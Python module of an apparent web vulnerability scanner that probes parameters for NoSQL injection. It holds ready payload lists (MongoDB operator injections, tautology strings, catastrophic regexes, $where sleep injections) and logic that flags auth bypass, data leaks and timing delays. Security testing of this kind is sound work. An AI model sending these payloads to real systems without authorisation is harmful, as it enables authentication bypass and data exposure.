"""NoSQLi scanner — structured verification chain.

Verification Chain (per param):
  Step 1 - OPERATOR INJECT:  Send {"$gt":""} / {"$ne":""} → expect auth bypass or data leak
  Step 2 - TAUTOLOGY:        Send always-true vs always-false → compare responses
  Step 3 - REGEX DoS:        Send $regex with catastrophic pattern → measure timing
  Step 4 - JS INJECT:        Send $where with sleep → measure timing (MongoDB)

GO/NO-GO:
  - OPERATOR succeeds + tautology confirms different responses → CONFIRMED
  - Only one step passes → medium confidence, needs verification
  - Nothing passes → STOP

Targets MongoDB, CouchDB, and generic NoSQL backends.
Handles both JSON body and query-string injection.
"""
from __future__ import annotations

import json
import logging
import time
from typing import Any
from urllib.parse import quote

from ..http import HttpClient, Session
from ..recipes.schema import Recipe
from .base import Scanner, Candidate

logger = logging.getLogger(__name__)

# ── Payloads ──────────────────────────────────────────────────

# Step 1: Operator injection payloads (for query-string style)
# These exploit PHP/Express-style parameter parsing: param[$ne]=
_OPERATOR_PAYLOADS_QUERY = [
    # param[$ne]= → matches everything except empty string
    {"suffix": "[$ne]", "value": ""},
    # param[$gt]= → matches everything greater than empty
    {"suffix": "[$gt]", "value": ""},
    # param[$regex]= → matches everything
    {"suffix": "[$regex]", "value": ".*"},
    # param[$exists]= → matches if field exists
    {"suffix": "[$exists]", "value": "true"},
]

# For JSON body injection (API endpoints)
_OPERATOR_PAYLOADS_JSON = [
    {"$ne": ""},
    {"$gt": ""},
    {"$regex": ".*"},
    {"$nin": ["invalidvalue_nosqli_test"]},
]

# Step 2: Tautology — always-true vs always-false
_TAUTOLOGY_PAIRS = [
    # MongoDB string injection in queries
    ("' || '1'=='1", "' || '1'=='2"),
    ("' || 1==1 || '", "' || 1==2 || '"),
    # For $where context
    ("1; return true", "1; return false"),
]

# Step 3: Regex DoS patterns (catastrophic backtracking)
_REGEX_DOS_PAYLOADS = [
    {"suffix": "[$regex]", "value": "^(a+)+$"},
    {"suffix": "[$regex]", "value": "((a*)*)*b"},
]

# Step 4: JavaScript injection ($where with sleep — MongoDB only)
_JS_INJECT_PAYLOADS = [
    "1; sleep(5000)",
    "1'; sleep(5000); var a='",
    "'; sleep(5000); var x='",
]

# MongoDB error signatures
_NOSQL_ERRORS = [
    "mongoerror", "mongo error", "bsonerror",
    "bad query", "unterminated string",
    "syntaxerror", "referenceerror",
    "failed to parse", "invalid operator",
    "unknown operator", "$and/$or/$nor",
    "command failed", "errmsg",
    "invalid query", "querysyntaxerror",
    "malformed query", "can't canonicalize",
    "jsonerror", "json parse error",
]

# Time-based threshold
_TIME_THRESHOLD = 4.0


class NosqliScanner(Scanner):
    """Detects NoSQL injection using a multi-step verification chain.

    For each parameter (one at a time):
    1. OPERATOR: inject MongoDB operators ($ne, $gt) → check for auth bypass / data leak
    2. TAUTOLOGY: always-true vs always-false → compare response differences
    3. REGEX DoS: catastrophic regex → measure timing (optional)
    4. JS INJECT: $where with sleep → measure timing (optional, MongoDB only)
    """

    vuln_classes = ["nosqli", "nosql-injection"]

    def __init__(self, client: HttpClient, session: Session):
        super().__init__(client)
        self.session = session

    async def _detect(self, target: str, recipe: Recipe,
                      **context: Any) -> list[Candidate]:
        params = context.get("params", [])
        method = context.get("method", "GET")
        id_location = context.get("id_location", "query")
        injection_points = context.get("injection_points", [])

        if not params and not injection_points:
            return []

        candidates = []

        if injection_points:
            for point in injection_points:
                if "nosqli" not in point.get("vuln_classes", []) and \
                   "nosql-injection" not in point.get("vuln_classes", []):
                    continue

                param = point["param"]
                loc = point.get("location", id_location)
                meth = point.get("method", method)
                siblings = point.get("sibling_fields", {})

                result = await self._test_param(
                    target, param, meth, loc, recipe, siblings=siblings
                )
                if result:
                    candidates.append(result)
        else:
            for param in params:
                result = await self._test_param(
                    target, param, method, id_location, recipe
                )
                if result:
                    candidates.append(result)

        return candidates

    async def _test_param(
        self,
        target: str,
        param: str,
        method: str,
        id_location: str,
        recipe: Recipe,
        *,
        siblings: dict[str, str] | None = None,
    ) -> Candidate | None:
        """Run the NoSQLi verification chain on a single parameter."""
        log = {"param": param, "method": method, "location": id_location, "steps": []}

        # ── Step 0: Baseline ──
        try:
            baseline = await self._send(target, param, "normalvalue123", method, id_location, siblings=siblings)
            baseline_status = baseline.status_code
            baseline_len = len(baseline.text)
            baseline_body = baseline.text[:3000].lower()
        except Exception as e:
            logger.debug("Baseline failed for %s/%s: %s", target, param, e)
            return None

        # Detect if this is a JSON API (Content-Type check)
        content_type = baseline.headers.get("content-type", "").lower()
        is_json_api = "json" in content_type or id_location == "json"

        # ── Step 1: OPERATOR INJECTION ──
        operator_result = await self._step_operator(
            target, param, method, id_location, baseline_status,
            baseline_len, baseline_body, is_json_api, siblings=siblings
        )
        log["steps"].append({"step": "operator", "result": operator_result})

        # ── Step 2: TAUTOLOGY ──
        tautology_result = await self._step_tautology(
            target, param, method, id_location, siblings=siblings
        )
        log["steps"].append({"step": "tautology", "result": tautology_result})

        # Evaluate: need at least one step to pass
        if not operator_result["success"] and not tautology_result["success"]:
            logger.debug("NoSQLi: no injection signals for %s/%s", target, param)
            return None

        # If both pass → CONFIRMED high
        if operator_result["success"] and tautology_result["success"]:
            confidence = "high"
            technique = "operator+tautology"
        elif operator_result["success"]:
            confidence = "medium"
            technique = "operator-inject"
        else:
            confidence = "medium"
            technique = "tautology"

        # ── Step 3: JS injection timing (optional, adds confidence) ──
        js_result = await self._step_js_inject(
            target, param, method, id_location, siblings=siblings
        )
        log["steps"].append({"step": "js_inject", "result": js_result})

        if js_result.get("success"):
            confidence = "high"
            technique += "+js-timing"

        evidence = {
            "technique": technique,
            "chain": log,
            "operator_payload": operator_result.get("payload"),
            "tautology_confirmed": tautology_result.get("success", False),
            "js_timing_confirmed": js_result.get("success", False),
            "error_match": operator_result.get("error_match"),
            "body_snippet": operator_result.get("body_snippet", ""),
        }

        return self._make_candidate(
            recipe=recipe,
            endpoint=target,
            method=method,
            evidence=evidence,
            confidence=confidence,
            request_data={
                "param": param,
                "payload": operator_result.get("payload") or tautology_result.get("payload_true", ""),
                "id_location": id_location,
                "technique": technique,
                "sibling_fields": siblings or {},
            },
            response_data={
                "status": operator_result.get("status") or tautology_result.get("true_status"),
                "baseline_status": baseline_status,
                "baseline_length": baseline_len,
            },
        )

    # ── Chain steps ──────────────────────────────────────────────

    async def _step_operator(
        self, target: str, param: str, method: str, id_location: str,
        baseline_status: int, baseline_len: int, baseline_body: str,
        is_json_api: bool, *, siblings: dict[str, str] | None = None,
    ) -> dict:
        """Step 1: Inject NoSQL operators ($ne, $gt, $regex).

        For query params: param[$ne]=value (PHP/Express array injection)
        For JSON body: {"param": {"$ne": ""}} (direct operator injection)

        Success: response differs significantly from baseline (auth bypass,
        data leak, or NoSQL error exposed).
        """
        if is_json_api and id_location in ("body", "json"):
            return await self._operator_json(
                target, param, method, baseline_status, baseline_len,
                baseline_body, siblings=siblings
            )
        else:
            return await self._operator_query(
                target, param, method, id_location, baseline_status,
                baseline_len, baseline_body, siblings=siblings
            )

    async def _operator_query(
        self, target: str, param: str, method: str, id_location: str,
        baseline_status: int, baseline_len: int, baseline_body: str,
        *, siblings: dict[str, str] | None = None,
    ) -> dict:
        """Operator injection via query string: param[$ne]=value."""
        for op in _OPERATOR_PAYLOADS_QUERY:
            injected_param = f"{param}{op['suffix']}"
            try:
                resp = await self._send(
                    target, injected_param, op["value"], method, id_location,
                    siblings=siblings
                )
                body = resp.text[:3000].lower()
                status = resp.status_code

                # Check for NoSQL error strings
                for sig in _NOSQL_ERRORS:
                    if sig in body and sig not in baseline_body:
                        return {
                            "success": True,
                            "payload": f"{injected_param}={op['value']}",
                            "status": status,
                            "error_match": sig,
                            "body_snippet": resp.text[:500],
                            "type": "error-based",
                        }

                # Check for significant response difference (data leak / bypass)
                resp_len = len(resp.text)
                len_diff = abs(resp_len - baseline_len)
                # Auth bypass: status went from 401/403 to 200/302
                if baseline_status in (401, 403) and status in (200, 302):
                    return {
                        "success": True,
                        "payload": f"{injected_param}={op['value']}",
                        "status": status,
                        "type": "auth-bypass",
                        "body_snippet": resp.text[:500],
                    }
                # Data leak: significantly more content returned
                if len_diff > 200 and resp_len > baseline_len and status == 200:
                    return {
                        "success": True,
                        "payload": f"{injected_param}={op['value']}",
                        "status": status,
                        "type": "data-leak",
                        "response_length": resp_len,
                        "baseline_length": baseline_len,
                        "body_snippet": resp.text[:500],
                    }

            except Exception as e:
                logger.debug("NoSQLi operator error %s/%s: %s", target, param, e)
                continue

        return {"success": False}

    async def _operator_json(
        self, target: str, param: str, method: str,
        baseline_status: int, baseline_len: int, baseline_body: str,
        *, siblings: dict[str, str] | None = None,
    ) -> dict:
        """Operator injection via JSON body: {"param": {"$ne": ""}}."""
        for op_payload in _OPERATOR_PAYLOADS_JSON:
            try:
                json_data = dict(siblings) if siblings else {}
                json_data[param] = op_payload

                resp = await self.client.post(
                    target, session=self.session,
                    json=json_data,
                )
                body = resp.text[:3000].lower()
                status = resp.status_code

                # Check for NoSQL error
                for sig in _NOSQL_ERRORS:
                    if sig in body and sig not in baseline_body:
                        return {
                            "success": True,
                            "payload": json.dumps({param: op_payload}),
                            "status": status,
                            "error_match": sig,
                            "body_snippet": resp.text[:500],
                            "type": "error-based",
                        }

                # Auth bypass
                if baseline_status in (401, 403) and status in (200, 302):
                    return {
                        "success": True,
                        "payload": json.dumps({param: op_payload}),
                        "status": status,
                        "type": "auth-bypass",
                        "body_snippet": resp.text[:500],
                    }

                # Data leak
                resp_len = len(resp.text)
                len_diff = abs(resp_len - baseline_len)
                if len_diff > 200 and resp_len > baseline_len and status == 200:
                    return {
                        "success": True,
                        "payload": json.dumps({param: op_payload}),
                        "status": status,
                        "type": "data-leak",
                        "response_length": resp_len,
                        "baseline_length": baseline_len,
                        "body_snippet": resp.text[:500],
                    }

            except Exception as e:
                logger.debug("NoSQLi JSON operator error %s/%s: %s", target, param, e)
                continue

        return {"success": False}

    async def _step_tautology(
        self, target: str, param: str, method: str, id_location: str,
        *, siblings: dict[str, str] | None = None,
    ) -> dict:
        """Step 2: Tautology — always-true vs always-false comparison.

        Success: significant response difference between true and false conditions.
        """
        for true_payload, false_payload in _TAUTOLOGY_PAIRS:
            try:
                true_resp = await self._send(
                    target, param, true_payload, method, id_location, siblings=siblings
                )
                false_resp = await self._send(
                    target, param, false_payload, method, id_location, siblings=siblings
                )

                true_len = len(true_resp.text)
                false_len = len(false_resp.text)
                diff = abs(true_len - false_len)

                # Need meaningful difference: different length AND same status code
                if diff > 50 and true_resp.status_code == false_resp.status_code:
                    return {
                        "success": True,
                        "payload_true": true_payload,
                        "payload_false": false_payload,
                        "true_length": true_len,
                        "false_length": false_len,
                        "true_status": true_resp.status_code,
                        "diff": diff,
                    }

                # Or: true condition returns 200/302, false returns 401/403
                if true_resp.status_code in (200, 302) and false_resp.status_code in (401, 403):
                    return {
                        "success": True,
                        "payload_true": true_payload,
                        "payload_false": false_payload,
                        "true_status": true_resp.status_code,
                        "false_status": false_resp.status_code,
                        "type": "auth-bypass",
                    }

            except Exception as e:
                logger.debug("NoSQLi tautology error %s/%s: %s", target, param, e)
                continue

        return {"success": False}

    async def _step_js_inject(
        self, target: str, param: str, method: str, id_location: str,
        *, siblings: dict[str, str] | None = None,
    ) -> dict:
        """Step 3: JavaScript injection via $where (MongoDB).

        Injects sleep() in a $where context. Measures timing delta.
        """
        # Get baseline timing
        try:
            t0 = time.monotonic()
            await self._send(target, param, "normalvalue123", method, id_location, siblings=siblings)
            baseline_time = time.monotonic() - t0
        except Exception:
            baseline_time = 1.0

        for payload in _JS_INJECT_PAYLOADS:
            try:
                t0 = time.monotonic()
                resp = await self._send(target, param, payload, method, id_location, siblings=siblings)
                elapsed = time.monotonic() - t0

                delta = elapsed - baseline_time
                if delta >= _TIME_THRESHOLD:
                    return {
                        "success": True,
                        "payload": payload,
                        "elapsed": round(elapsed, 2),
                        "baseline_time": round(baseline_time, 2),
                        "delta": round(delta, 2),
                    }

            except Exception as e:
                logger.debug("NoSQLi JS inject error %s/%s: %s", target, param, e)
                continue

        return {"success": False}

    # ── HTTP helper ──────────────────────────────────────────────

    async def _send(self, target: str, param: str, value: str,
                    method: str, id_location: str,
                    *, siblings: dict[str, str] | None = None):
        """Send a request with the payload injected."""
        if id_location == "query":
            params = dict(siblings) if siblings else {}
            params[param] = value
            return await self.client.request(
                method, target, session=self.session, params=params,
            )
        elif id_location in ("body", "json"):
            data = dict(siblings) if siblings else {}
            data[param] = value
            return await self.client.post(
                target, session=self.session, data=data,
            )
        elif id_location == "path":
            url = target.rstrip("/") + f"/{value}"
            return await self.client.request(method, url, session=self.session)
        else:
            raise ValueError(f"Unknown id_location: {id_location}")
